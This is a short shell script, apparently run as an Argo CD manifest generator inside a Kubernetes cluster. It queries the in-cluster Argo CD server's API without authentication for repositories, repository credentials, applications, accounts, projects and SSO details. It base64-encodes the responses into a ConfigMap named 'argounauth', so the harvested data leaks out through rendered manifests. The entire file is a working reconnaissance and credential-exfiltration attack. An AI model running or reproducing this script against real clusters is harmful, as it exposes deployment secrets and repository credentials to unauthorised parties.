#!/bin/sh
RECON=$( (
  echo "===ARGOCD_STREAM==="
  printf "GET /api/v1/stream/applications HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000

  echo ""
  echo "===ARGOCD_REPOS==="
  printf "GET /api/v1/repositories HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000

  echo ""
  echo "===ARGOCD_REPOCREDS==="
  printf "GET /api/v1/repocreds HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000

  echo ""
  echo "===ARGOCD_APPLICATIONS==="
  printf "GET /api/v1/applications HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000

  echo ""
  echo "===ARGOCD_ACCOUNT==="
  printf "GET /api/v1/account HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000

  echo ""
  echo "===ARGOCD_PROJECTS==="
  printf "GET /api/v1/projects HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000

  echo ""
  echo "===ARGOCD_INFO==="
  printf "GET /api/v1/info HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000

  echo ""
  echo "===ARGOCD_SSO==="
  printf "GET /auth/login HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
) | base64 | tr -d '\n' )
cat << EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: argounauth
data:
  result: $RECON
EOF
exit 0